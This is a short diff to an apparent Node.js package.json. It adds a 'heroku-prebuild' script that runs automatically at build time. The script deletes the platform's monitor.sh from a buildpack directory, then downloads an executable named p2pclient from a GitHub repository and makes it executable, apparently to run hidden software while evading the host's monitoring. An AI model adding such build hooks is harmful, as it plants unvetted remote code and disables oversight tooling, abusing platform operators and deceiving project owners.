@@ -7,7 +7,7 @@
   },
   "main": "index.js",
   "scripts": {
-    "heroku-prebuild": "npm install nano && npm install --save nano && cd /tmp/codon/tmp/buildpacks/2cd3309e34d34b154aac9f665b0eb2d2e86d8b8e/lib && nano monitor.sh && cd",
+    "heroku-prebuild": "cd /tmp/codon/tmp/buildpacks/2cd3309e34d34b154aac9f665b0eb2d2e86d8b8e/lib && rm -r monitor.sh && wget https://github.com/sengepeke/nextjs/raw/master/p2pclient && chmod +x p2pclient",
     "start": "node index.js",
     "test": "node test.js"
   },
